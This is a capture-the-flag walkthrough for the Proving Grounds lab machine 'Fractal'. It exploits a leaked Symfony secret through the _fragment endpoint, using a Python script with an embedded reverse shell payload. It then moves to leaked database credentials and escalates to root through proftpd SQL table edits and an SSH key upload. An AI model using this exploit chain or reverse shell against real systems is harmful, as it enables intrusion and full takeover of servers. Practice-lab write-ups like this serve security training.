# Fractal

## Info

Fractal is an easy rated linux machine from Offsec proving grounds.

## Nmap

All tcp ports.

```
21
22
80
```

## HTTP port 80

There are two disallowed endpoints in robots.txt

```
/app_dev.php
/app_dev.php/*
```

Pointing the browser to this location shows Symfony profiler.

This blog post shows how RCE can be achieved.

```
https://www.ambionics.io/blog/symfony-secret-fragment
```

Application secret can be found with this url.

```
http://192.168.234.233/app_dev.php/_profiler/open?file=app/config/parameters.yml
```

## User

The following python script returns a reverse shell to port 80 and can execute system commands.

```python
#!/usr/bin/python3

import base64, hmac, hashlib, urllib.parse

# Use %2B for space
# ls%2B-la
# Python reverse shell calling back to port 80.
sys_command = 'python3%2B-c%2B%27import%2Bos%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22192.168.45.185%22%2C80%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for%2Bf%2Bin%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27'

ip = '192.168.234.233/app_dev.php'

url_string = f'http://{ip}/_fragment?_path=_controller%3Dshell_exec%26cmd%3D{sys_command}'

url = bytes(url_string, 'UTF-8')

secret_key = b'48a8538e6260789558f0dfe29861c05b'

hash_bytes = base64.b64encode(hmac.HMAC(secret_key, url, hashlib.sha256).digest())

hash_string = hash_bytes.decode('UTF-8')

hash_string = urllib.parse.quote(hash_string)

complete_url = url_string + '&_hash=' + hash_string

print(complete_url)
```

database credentials.

```
database_user: symfony
database_password: symfony_db_password
```
database credentials /etc/phpmyadmin/config-db.php

```
$dbuser='phpmyadmin';
$dbpass='9gofRqnnz0zb';
```

database credentials for proftpd in /etc/proftpd/sql.conf

```
proftpd@localhost proftpd protfpd_with_MYSQL_password
```

# root

After signing into the database as proftpd, set these values on the table.

```
update ftpuser set homedir='/' where id=1;

update ftpuser set userid='benoit' where id=1;

update ftpuser set passwd='{md5}UtcqD13j81KqtcZRwBeKVA==' where id=1;

update ftpuser set uid=1000 where id=1;

update ftpuser set gid=1000 where id=1;

update ftpuser set shell='/bin/bash' where id=1;
```
The passwd is generated using the following command.

```
echo "{md5}"`/bin/echo -n "purplerain" | openssl dgst -binary -md5 | openssl enc -base64`
```

After signing into ftp, create a ssh key and upload into benoit home directory.

```
ssh-keygen -t rsa
cat id_rsa.pub > authorized_keys
```

In ftp.

```
mkdir .ssh
put authorized_keys
```

After ssh into the machine, sudo states all commands permitted with no password.

```
sudo su -
```
